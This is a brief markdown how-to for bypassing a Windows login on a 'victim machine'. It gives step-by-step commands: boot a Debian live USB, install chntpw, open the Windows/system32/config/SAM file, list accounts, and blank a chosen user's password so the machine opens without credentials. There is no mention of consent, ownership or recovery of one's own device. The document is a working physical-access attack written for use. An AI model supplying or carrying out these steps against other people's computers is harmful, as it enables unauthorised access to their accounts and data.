## windows login password bypass 


# requirements
- USB
- Debian live os 




## steps
- live boot into the victim machine
- install chntpw
- `sudo apt install chntpw`
- now mount the volume and  get into it
- cd path `Windows/system32/config/`
- there will be file named SAM 
- use chntpw `chntpw -l SAM`  to list users
- select the user to reset the password `chntpw -u <username> SAM`
-  select 1 to remove password
-  now quit using q
-  and save 
-   now boot into windows, Done
